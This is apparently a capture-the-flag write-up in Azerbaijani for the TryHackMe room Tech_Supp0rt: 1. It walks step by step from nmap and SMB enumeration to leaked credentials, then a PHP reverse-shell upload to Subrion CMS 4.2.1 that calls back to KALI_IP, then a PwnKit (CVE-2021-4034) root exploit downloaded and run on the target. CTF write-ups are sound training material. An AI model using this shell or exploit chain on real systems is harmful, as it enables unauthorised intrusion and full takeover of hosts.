# TryHackMe — Tech_Supp0rt: 1 Writeup (Azərbaycanca)

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Skanı

```bash
nmap -sV -sC -A 10.81.183.179
```

**Tapılan açıq portlar:**

| Port | Servis | Versiya |
|------|--------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.18 |
| 139/tcp | SMB | Samba 3.X - 4.X |
| 445/tcp | SMB | Samba 4.3.11-Ubuntu |

---

### Gobuster — Web Direktori Skanı

```bash
gobuster dir -u http://10.81.183.179 -w /usr/share/wordlists/dirb/common.txt
```

**Tapılanlar:**
- `/test/` → Fake popup səhifəsi
- `/wordpress/` → WordPress saytı
- `/phpinfo.php` → PHP məlumatları açıqdır (məlumat sızması!)

---

## 2. SMB Enumeration

```bash
smbclient -L //10.81.183.179 -N
```

`websvr` adlı paylaşım tapıldı. Guest session ilə daxil olduq:

```bash
smbclient //10.81.183.179/websvr -N
smb: \> ls
smb: \> get enter.txt
```

**enter.txt məzmunu:**
```
GOALS
=====
1) Fake popup host et
2) Subrion saytını düzəlt — /subrion işləmir, paneldən redaktə et
3) WordPress saytını redaktə et

IMP
===
Subrion creds
|-> admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

---

## 3. Şifrəni Decode Etmək

`"cooked with magical formula"` ifadəsi **CyberChef Magic** funksiyasına işarə edir.

Şifrə ardıcıl olaraq decode edildi:

```
Base58 → Base32 → Base64 → Scam2021
```

> CyberChef saytında (gchq.github.io/CyberChef) "Magic" əməliyyatı ilə avtomatik tapıldı.

**Nəticə:**
```
Username: admin
Password: Scam2021
```

---

## 4. Subrion CMS — Panelə Giriş

```
http://10.81.183.179/subrion/panel/
```

Credentials ilə giriş etdik: `admin` / `Scam2021`

Panel açıldı — **Subrion CMS v4.2.1** aşkar edildi.

> Bu versiyada **Authenticated File Upload RCE** mövcuddur!

---

## 5. Remote Code Execution (RCE)

### Metod: .phar File Upload

Subrion `.php` yükləməni bloklayır, lakin `.phar` icazə verir.

**shell.phar:**
```php
<?php
set_time_limit(0);
$ip = 'KALI_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>
```

**Kali-də listener aç:**
```bash
nc -lvnp 4444
```

**Subrion paneldə:**
```
Content → Uploads → shell.phar yüklə
```

**Trigger et:**
```
http://10.81.183.179/subrion/uploads/shell.phar
```

✅ `www-data` olaraq shell əldə etdik!

---

## 6. Shell Stabilizasiyası

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 7. Privilege Escalation

### SUID Faylları Axtarış

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Diqqəti çəkən fayl:**
```
/usr/bin/pkexec
```

```bash
pkexec --version
# pkexec version 0.105
```

---

### CVE-2021-4034 — PwnKit

`pkexec 0.105` versiyası məşhur **PwnKit** vulnerabilitysinə məruz qalır.

**Kali-də exploit hazırla:**
```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
python3 -m http.server 8080
```

**Target maşında:**
```bash
cd /tmp
wget http://KALI_IP:8080/PwnKit
chmod +x PwnKit
./PwnKit
```

**Yoxla:**
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

🎉 **ROOT ƏLDƏ EDİLDİ!**

---

## 8. Flagları Tap

**User flag:**
```bash
cat /home/scamsite/user.txt
```

**Root flag:**
```bash
cat /root/root.txt
```

---

## 9. Attack Chain Xülasəsi

```
Nmap skanı
    ↓
SMB websvr paylaşımı → enter.txt
    ↓
CyberChef decode → admin:Scam2021
    ↓
Subrion CMS v4.2.1 panelə giriş
    ↓
.phar file upload → RCE → www-data shell
    ↓
pkexec 0.105 → CVE-2021-4034 PwnKit
    ↓
ROOT 🏆
```

---

*Hazırladı: CTF Player | TryHackMe — Tech_Supp0rt: 1*
